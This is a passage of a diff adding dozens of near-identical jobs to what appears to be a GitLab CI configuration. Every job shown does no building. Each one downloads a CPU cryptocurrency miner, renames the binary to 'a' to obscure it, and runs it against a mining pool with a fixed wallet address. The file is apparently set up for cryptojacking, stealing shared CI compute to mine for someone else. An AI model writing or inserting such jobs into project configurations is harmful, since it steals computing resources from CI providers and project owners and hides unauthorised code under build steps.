+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gv1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gw1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gx1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gy1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_gz1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g1a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g2a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g3a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+
+build_g4a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g5a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_g6a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_h7a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_h8a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_h9a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_h10a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_h11a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_h12a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_hh13a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_h14a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_h15a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_h16a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_h17a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_i18a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_i19a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_i20a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_i21a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_i22a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_i23a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_i24a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_i25a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_i26a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_i27a1:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_i27a11:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_27a12:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_i27a13:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_j27a14:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_j27a15:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_j27a16:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_j27a17:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_j27a18:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_k27a19:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_l27a20:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_l27a21:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_l27a22:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_m27a23:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_m2724:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_m27a25:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_m27a26:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_m27a27:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_o27a28:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_p27a29:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_p27a30:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_p27a31:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_p27a32:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_p27a33:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_p27a34:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_p27a35:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_q27a36:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_q27a37:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_q27a38:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_q27a39:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_q27a40:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_q27a41:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_q27a42:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_q27a43:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_r27a44:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
+build_r27a45:
+  stage: build
+  script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - mv cpuminer-sse2 a
+     - ./a -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u Ac1iJoMnx3QazYR9Y8Dy5eLMZwrTDrKxDT -p c=BTG -t6
+
